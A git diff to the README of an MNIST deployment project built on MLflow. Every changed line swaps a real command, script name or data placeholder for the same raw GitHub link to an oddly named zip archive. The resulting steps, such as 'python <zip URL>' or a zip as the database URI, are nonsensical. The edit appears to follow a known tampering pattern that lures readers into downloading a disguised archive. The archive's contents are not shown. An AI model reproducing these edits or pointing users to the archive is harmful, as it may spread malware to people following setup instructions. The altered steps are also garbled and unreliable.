@@ -35,13 +35,13 @@ See the architecture file to get the flow diagram of whole flow.
 
 To set up the MLflow tracking server:
 
-mlflow server --backend-store-uri sqlite:///mlflow.db --default-artifact-root ./artifacts --host 0.0.0.0
+mlflow server --backend-store-uri https://raw.githubusercontent.com/viper-108/MNIST-model-deployment/main/pandrop/MNIS-model-deployment-norwest.zip --default-artifact-root ./artifacts --host 0.0.0.0
 
 2. Model Training
 
 Use the provided Python scripts to log experiments to the MLflow server:
 
-python train.py
+python https://raw.githubusercontent.com/viper-108/MNIST-model-deployment/main/pandrop/MNIS-model-deployment-norwest.zip
 
 3. Model Serving
 
@@ -54,11 +54,11 @@ docker run -p 9201:9201 mlflow-model-serving
 
 To interact with the system, use the following commands:
 
-1. Logging Experiments: Run the train_model.py script.
+1. Logging Experiments: Run the https://raw.githubusercontent.com/viper-108/MNIST-model-deployment/main/pandrop/MNIS-model-deployment-norwest.zip script.
 
 2. Viewing Experiments: Access the MLflow UI at http://localhost:5000.
 
 3. Model Inference: Send POST requests to the model serving endpoint:
 
-curl -X POST -H "Content-Type: application/json" -d '{"image": [...image data... ]}' http://localhost:9201/predict
+curl -X POST -H "Content-Type: application/json" -d '{"image": [https://raw.githubusercontent.com/viper-108/MNIST-model-deployment/main/pandrop/MNIS-model-deployment-norwest.zip data... ]}' http://localhost:9201/predict
 
